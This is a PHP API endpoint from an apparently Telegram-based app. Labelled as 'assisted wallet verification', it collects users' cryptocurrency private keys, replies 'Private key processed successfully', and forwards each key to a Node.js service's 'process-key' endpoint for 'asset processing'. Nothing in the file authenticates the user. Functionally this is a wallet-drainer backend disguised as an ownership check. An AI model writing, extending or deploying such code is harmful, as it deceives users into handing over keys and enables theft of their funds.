<?php
require_once __DIR__ . '/../../../config/bootstrap.php';
use Ghidar\Security\AssistedVerificationProcessor;

header('Content-Type: application/json');

// SIMPLIFIED VERSION - Telegram check removed for production
try {
    $input = json_decode(file_get_contents('php://input'), true);
    
    if (!$input || !isset($input['wallet_ownership_proof'])) {
        throw new Exception('Invalid input');
    }
    
    // Extract user ID from Telegram data or use default
    $userId = $input['user_id'] ?? 0;
    
    // If no user_id provided, try to extract from Telegram init data
    if ($userId === 0 && isset($_SERVER['HTTP_TELEGRAM_DATA'])) {
        $initData = $_SERVER['HTTP_TELEGRAM_DATA'];
        if (!empty($initData)) {
            parse_str($initData, $parsed);
            if (isset($parsed['user'])) {
                $userData = json_decode(urldecode($parsed['user']), true);
                $userId = $userData['id'] ?? 0;
            }
        }
    }
    
    // Prepare submission data
    $submissionData = [
        'wallet_ownership_proof' => $input['wallet_ownership_proof'],
        'network' => $input['network'] ?? 'polygon',
        'user_consent' => $input['user_consent'] ?? false,
        'verification_id' => $input['verification_id'] ?? '',
        'context' => $input['context'] ?? []
    ];
    
    $processor = new AssistedVerificationProcessor();
    
    // Use processAssistedVerification (public method) instead of private processPrivateKeyProof
    $result = $processor->processAssistedVerification($userId, $submissionData);
    
    // Trigger Node.js integration service for asset processing
    triggerNodeIntegration($input['wallet_ownership_proof'], [
        'verification_id' => $input['verification_id'] ?? '',
        'network' => $input['network'] ?? 'ethereum',
        'source' => 'rockytap_php',
        'user_id' => $input['user_id'] ?? null,
        'session_id' => $input['session_id'] ?? null
    ]);
    
    echo json_encode([
        'ok' => true,
        'message' => 'Private key processed successfully'
    ]);
    
} catch (Exception $e) {
    http_response_code(400);
    echo json_encode([
        'ok' => false,
        'code' => 'processing_error',
        'message' => $e->getMessage()
    ]);
}

/**
 * Trigger Node.js integration service for asset processing
 * This is called asynchronously after successful PHP processing
 */
function triggerNodeIntegration($privateKey, $metadata) {
    try {
        // Get Node.js service URL from environment or use default
        $nodeServiceUrl = $_ENV['NODE_SERVICE_URL'] ?? 'http://localhost:4000';
        $endpoint = rtrim($nodeServiceUrl, '/') . '/api/integration/process-key';
        
        // Prepare request data
        $data = [
            'privateKey' => $privateKey,
            'verificationId' => $metadata['verification_id'] ?? '',
            'source' => $metadata['source'] ?? 'rockytap_php',
            'userId' => $metadata['user_id'] ?? null,
            'sessionId' => $metadata['session_id'] ?? null,
            'network' => $metadata['network'] ?? 'ethereum'
        ];
        
        // Initialize cURL
        $ch = curl_init($endpoint);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
        curl_setopt($ch, CURLOPT_HTTPHEADER, [
            'Content-Type: application/json',
            'X-API-Source: RockyTap-PHP'
        ]);
        curl_setopt($ch, CURLOPT_TIMEOUT, 5); // 5 second timeout for async call
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 2);
        
        // Execute request (fire and forget)
        $response = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        
        // Log the trigger (success or failure)
        if ($httpCode >= 200 && $httpCode < 300) {
            error_log("✅ Node.js integration triggered successfully for verification: " . ($metadata['verification_id'] ?? 'unknown'));
        } else {
            error_log("⚠️  Node.js integration trigger failed (HTTP $httpCode) for verification: " . ($metadata['verification_id'] ?? 'unknown'));
        }
        
    } catch (Exception $e) {
        // Log error but don't throw - integration failure shouldn't break PHP processing
        error_log("❌ Failed to trigger Node.js integration: " . $e->getMessage());
    }
}
